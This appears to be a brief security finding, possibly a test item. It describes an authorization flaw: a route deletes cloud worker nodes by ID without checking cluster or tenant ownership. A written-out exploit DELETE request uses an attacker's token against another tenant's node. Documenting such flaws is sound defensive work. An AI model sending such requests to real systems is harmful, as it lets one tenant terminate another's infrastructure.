diagnosis: The route handler deletes a WorkerNodeDocument directly by node_id. It accepts cluster_id in the URL path but does not check that the node actually belongs to cluster_id or that current_user is the tenant administrator owning cluster_id. Any authenticated user can terminate cloud worker nodes of other tenants.
exploit_request:
DELETE /infrastructure/clusters/cls_prod_eu_central/worker-nodes/65c78a10f849129031d90472 HTTP/1.1
Host: cloud.orchestrator.io
Authorization: Bearer <tenant_attacker_token>
